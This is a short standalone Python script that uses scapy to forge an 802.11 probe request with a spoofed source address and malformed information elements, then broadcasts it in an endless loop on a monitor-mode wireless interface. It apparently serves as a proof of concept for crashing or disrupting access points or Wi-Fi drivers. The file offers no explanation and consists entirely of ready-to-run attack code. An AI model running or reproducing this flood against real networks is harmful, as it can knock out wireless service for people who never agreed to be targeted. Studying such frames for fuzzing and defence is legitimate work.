#!/usr/bin/python
import sys
from scapy.all import *
probeReq = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="ff:ff:ff:ff:ff:ff")/Dot11ProbeReq()/Dot11Elt(ID="SSID", info='')/Dot11Elt(ID="Rates", info='\x00\x00\x00\x00')/Dot11Elt(ID="DSset", info='\n')/Dot11Elt(ID=45, info='o\x18\x1e\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')/Dot11Elt(ID=127, info='\x00\x00\x00\x00\x00\x00\x00@')/Dot11Elt(ID="vendor", info='\x00\x10\x18\x02\x00\x00\x00\x00\x00')/Dot11Elt(ID="vendor", info='\x00\x90L3o\x18\x1e\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')/Dot11Elt(ID=25, info='\xb6\xec')
conf.iface = "wlan0mon"
sendp(probeReq,inter=.2,loop=1)
